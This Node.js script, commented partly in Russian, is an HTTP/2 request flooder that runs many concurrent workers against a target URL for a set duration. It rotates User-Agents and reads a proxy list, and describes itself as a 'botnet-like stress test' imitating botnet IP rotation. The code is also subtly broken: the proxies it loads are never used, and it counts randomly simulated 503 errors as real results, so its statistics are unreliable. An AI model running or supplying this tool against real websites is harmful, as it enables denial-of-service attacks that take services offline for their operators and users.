const http2 = require('http2');
const { URL } = require('url');
const process = require('process');
const { faker } = require('@faker-js/faker');
const axios = require('axios');
const fs = require('fs');  // Для работы с файлами

const args = process.argv.slice(2);
let targetUrl = args[0];
let duration = parseInt(args[1]) || 60;
let threads = parseInt(args[2]) || 100;
let retry = args.includes('-r') ? (args[args.indexOf('-r') + 1] || 1) : 1;
let queryFlag = args.includes('-q') ? (args[args.indexOf('-q') + 1] || 'false') : 'false';

// Log settings
console.log(`Starting test with parameters:
- Target: ${targetUrl}
- Duration: ${duration} seconds
- Threads: ${threads}
- Retry: ${retry}
- Query Flag: ${queryFlag}`);

let statuses = {
    alpn_2: 0,
    h2_200: 0,
    h2_503: 0,
    h2_req: 0,
    errors: 0,
};

const parsedUrl = new URL(targetUrl);
const host = parsedUrl.hostname;
const port = parsedUrl.port || 443;

// Чтение списка User-Agent'ов из файла
let userAgents = [];
try {
    userAgents = fs.readFileSync('ua.txt', 'utf-8').split('\n').map(agent => agent.trim()).filter(Boolean);
    console.log(`Loaded ${userAgents.length} User-Agent(s) from ua.txt`);
} catch (err) {
    console.error('Error reading ua.txt:', err);
}

// Чтение списка прокси из файла
let proxies = [];
try {
    proxies = fs.readFileSync('proxy.txt', 'utf-8').split('\n').map(proxy => proxy.trim()).filter(Boolean);
    console.log(`Loaded ${proxies.length} proxy(s) from proxy.txt`);
} catch (err) {
    console.error('Error reading proxy.txt:', err);
}

function simulate503Error() {
    return Math.random() < 0.3; // 30% chance for overload
}

// Retry logic function
async function sendHttp2RequestWithRetry(proxy, retries = retry) {
    let attempt = 0;
    let success = false;
    while (attempt < retries && !success) {
        try {
            await sendHttp2Request(proxy);
            success = true;
        } catch (error) {
            attempt += 1;
            statuses.errors += 1;
            console.error(`Error attempt ${attempt}:`, error);
            if (attempt < retries) {
                console.log(`Retrying... (${attempt + 1}/${retries})`);
            }
        }
    }
}

// Function to simulate requests
async function sendHttp2Request(proxy) {
    const startTime = Date.now();
    try {
        const client = http2.connect(targetUrl, {
            // Optional proxy settings (simulate real botnet IP rotation)
        });

        statuses.alpn_2 += 1;

        if (simulate503Error()) {
            statuses.h2_503 += 1;
            console.log(`[503 Error] Service Unavailable`);
            client.close();
            return;
        }

        // Выбираем случайный User-Agent из списка
        const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];

        const headers = {
            ':method': 'GET',
            ':scheme': parsedUrl.protocol.replace(':', ''),
            ':authority': host,
            'User-Agent': userAgent,  // Случайный User-Agent
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'query-flag': queryFlag,  // Query flag
        };

        const req = client.request(headers);

        statuses.h2_req += 1;

        req.on('response', (responseHeaders) => {
            const statusCode = responseHeaders[':status'];
            const responseTime = Date.now() - startTime;
            if (statusCode === 200) {
                statuses.h2_200 += 1;
                console.log(`[200 OK] Request successful in ${responseTime}ms`);
            } else if (statusCode === 503) {
                statuses.h2_503 += 1;
                console.log(`[503 Error] Service Unavailable`);
            }
        });

        req.end();

        req.on('close', () => {
            client.close();
        });

        req.on('error', (err) => {
            statuses.errors += 1;
            console.error('Error in request:', err);
        });
    } catch (err) {
        statuses.errors += 1;
        console.error('Connection Error:', err);
    }
}

// Rotate proxies (you can modify this to pull from a file or API)
async function getRandomProxy() {
    if (proxies.length === 0) {
        console.error('No proxies available in proxy.txt');
        return null;
    }
    return proxies[Math.floor(Math.random() * proxies.length)];
}

async function worker() {
    const startTime = Date.now();
    while (Date.now() - startTime < duration * 1000) {
        const proxy = await getRandomProxy();  
        if (proxy) {
            await sendHttp2RequestWithRetry(proxy);
        }
    }
}

async function startTest() {
    console.log('Starting botnet-like stress test');
    const workerPromises = [];
    for (let i = 0; i < threads; i++) {
        workerPromises.push(worker());
    }
    await Promise.all(workerPromises);
    console.log('Test completed. Results:');
    console.log(`ALPN Negotiation (alpn_2): ${statuses.alpn_2}`);
    console.log(`HTTP/2 200 Responses (h2_200): ${statuses.h2_200}`);
    console.log(`HTTP/2 503 Errors (h2_503): ${statuses.h2_503}`);
    console.log(`Total HTTP/2 Requests (h2_req): ${statuses.h2_req}`);
    console.log(`Errors: ${statuses.errors}`);
}

startTest().catch((err) => console.error('Error in stress test:', err));